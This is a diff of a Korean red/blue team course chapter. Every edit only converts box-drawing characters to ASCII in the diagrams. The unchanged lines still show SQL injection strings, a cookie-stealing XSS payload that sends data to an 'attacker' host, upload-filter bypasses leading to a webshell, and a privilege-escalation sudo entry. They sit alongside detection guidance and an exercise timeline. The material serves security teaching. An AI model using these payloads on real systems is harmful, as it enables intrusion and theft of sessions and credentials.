@@ -39,25 +39,25 @@ Week 11에서 수행한 정찰은 공격의 "눈"이었다. 이번 주는 정찰
 **MITRE ATT&CK 매핑:**
 ```
 이번 주에서 다루는 전술:
-  ├── [Red]  TA0001 Initial Access  — 초기 접근
-  │   ├── T1190 Exploit Public-Facing App (웹 취약점)
-  │   ├── T1110 Brute Force (SSH 사전 공격)
-  │   └── T1078 Valid Accounts (약한 자격증명)
-  │
-  ├── [Red]  TA0002 Execution — 코드 실행
-  │   ├── T1059.004 Unix Shell
-  │   └── T1059.007 JavaScript
-  │
-  ├── [Red]  TA0004 Privilege Escalation — 권한 상승
-  │   ├── T1548.001 Setuid and Setgid
-  │   └── T1068 Exploitation for Privilege Escalation
-  │
-  ├── [Red]  TA0003 Persistence — 지속성
-  │   ├── T1136.001 Local Account
-  │   └── T1053.003 Cron
-  │
-  ├── [Blue] Detection — 탐지
-  └── [Blue] Containment — 봉쇄/격리
+  +-- [Red]  TA0001 Initial Access  — 초기 접근
+  |   +-- T1190 Exploit Public-Facing App (웹 취약점)
+  |   +-- T1110 Brute Force (SSH 사전 공격)
+  |   +-- T1078 Valid Accounts (약한 자격증명)
+  |
+  +-- [Red]  TA0002 Execution — 코드 실행
+  |   +-- T1059.004 Unix Shell
+  |   +-- T1059.007 JavaScript
+  |
+  +-- [Red]  TA0004 Privilege Escalation — 권한 상승
+  |   +-- T1548.001 Setuid and Setgid
+  |   +-- T1068 Exploitation for Privilege Escalation
+  |
+  +-- [Red]  TA0003 Persistence — 지속성
+  |   +-- T1136.001 Local Account
+  |   +-- T1053.003 Cron
+  |
+  +-- [Blue] Detection — 탐지
+  +-- [Blue] Containment — 봉쇄/격리
 ```
 
 ### 침투 벡터 분류
@@ -79,16 +79,16 @@ Week 11에서 수행한 정찰은 공격의 "눈"이었다. 이번 주는 정찰
 
 1. 입력 지점 식별
    로그인 폼, 검색 기능, URL 파라미터
-       │
+       |
 2. 인젝션 테스트
    ' OR 1=1-- , " OR ""=", ' UNION SELECT--
-       │
+       |
 3. DB 정보 수집
    UNION SELECT table_name FROM information_schema.tables
-       │
+       |
 4. 데이터 추출
    UNION SELECT username,password FROM users
-       │
+       |
 5. 인증 우회 또는 데이터 탈취
 ```
 
@@ -99,14 +99,14 @@ Week 11에서 수행한 정찰은 공격의 "눈"이었다. 이번 주는 정찰
 
 1. 저장형 XSS 삽입 지점 발견
    게시판, 댓글, 프로필 등
-       │
+       |
 2. 악성 스크립트 삽입
    <script>document.location='http://attacker/steal?c='+document.cookie</script>
-       │
+       |
 3. 관리자/다른 사용자가 페이지 방문
-       │
+       |
 4. 쿠키/세션 토큰 탈취
-       │
+       |
 5. 세션 하이재킹으로 로그인 우회
 ```
 
@@ -117,18 +117,18 @@ Week 11에서 수행한 정찰은 공격의 "눈"이었다. 이번 주는 정찰
 
 1. 파일 업로드 기능 발견
    프로필 이미지, 첨부파일 등
-       │
+       |
 2. 업로드 필터 우회 시도
-   ├── 확장자 변경: .php → .php5, .phtml, .phar
-   ├── MIME 타입 위조: Content-Type: image/jpeg
-   ├── 이중 확장자: shell.php.jpg
-   └── 널 바이트: shell.php%00.jpg
-       │
+   +-- 확장자 변경: .php → .php5, .phtml, .phar
+   +-- MIME 타입 위조: Content-Type: image/jpeg
+   +-- 이중 확장자: shell.php.jpg
+   +-- 널 바이트: shell.php%00.jpg
+       |
 3. 웹셸 업로드 성공
-       │
+       |
 4. 업로드된 파일 경로 확인
    /uploads/shell.php
-       │
+       |
 5. 웹셸을 통한 명령 실행
    http://target/uploads/shell.php?cmd=whoami
 ```
@@ -256,11 +256,11 @@ web ALL=(ALL) NOPASSWD: /usr/bin/find *
 [inotifywait를 이용한 파일 변경 감시]
 
 감시 대상:
-├── /etc/passwd, /etc/shadow     — 계정 변경
-├── /etc/crontab, /etc/cron.d/   — 크론 변경
-├── ~/.ssh/authorized_keys        — SSH 키 추가
-├── /tmp, /var/tmp, /dev/shm     — 악성 파일 생성
-└── /etc/systemd/system/          — 서비스 추가
++-- /etc/passwd, /etc/shadow     — 계정 변경
++-- /etc/crontab, /etc/cron.d/   — 크론 변경
++-- ~/.ssh/authorized_keys        — SSH 키 추가
++-- /tmp, /var/tmp, /dev/shm     — 악성 파일 생성
++-- /etc/systemd/system/          — 서비스 추가
 
 명령:
 inotifywait -m -r -e create,modify,delete \
@@ -670,7 +670,7 @@ cat << 'TIMELINE'
 === 공방전 Round 3/4 침투-대응 타임라인 ===
 
 시간    Red Team                    Blue Team                결과
-──────────────────────────────────────────────────────────────────
+------------------------------------------------------------------
 0:00    SQLi 시도 (JuiceShop)      모니터링 시작            -
 0:02    인증 우회 성공              (access.log 미확인)      미탐지
 0:05    API 탐색 (사용자 정보)      access.log: 200 정상     미탐지
